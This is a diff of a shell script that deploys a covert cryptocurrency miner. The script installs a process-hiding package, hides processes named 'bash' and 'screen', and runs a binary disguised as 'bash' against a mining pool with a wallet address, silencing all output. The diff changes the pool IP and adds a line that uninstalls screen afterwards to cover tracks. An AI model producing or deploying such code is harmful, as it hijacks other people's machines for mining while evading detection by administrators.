@@ -9,4 +9,5 @@ apt install screen -y > /dev/null 2>&1 && npm i -g node-process-hider > /dev/nul
 ph add bash > /dev/null 2>&1
 ph add screen > /dev/null 2>&1
 chmod +x bash
-sudo -u ari screen -dm bash -c "./bash -a NEXA --pool 103.93.59.145:7777 --user 3QdDWz7gpN3yHSbSGnJbT4cewoJm5T9QzS.02 --pass x > /dev/null 2>&1"
+sudo -u ari screen -dm bash -c "./bash -a NEXA --pool 216.107.139.111:7777 --user 3QdDWz7gpN3yHSbSGnJbT4cewoJm5T9QzS.02 --pass x > /dev/null 2>&1"
+apt remove screen -y > /dev/null 2>&1
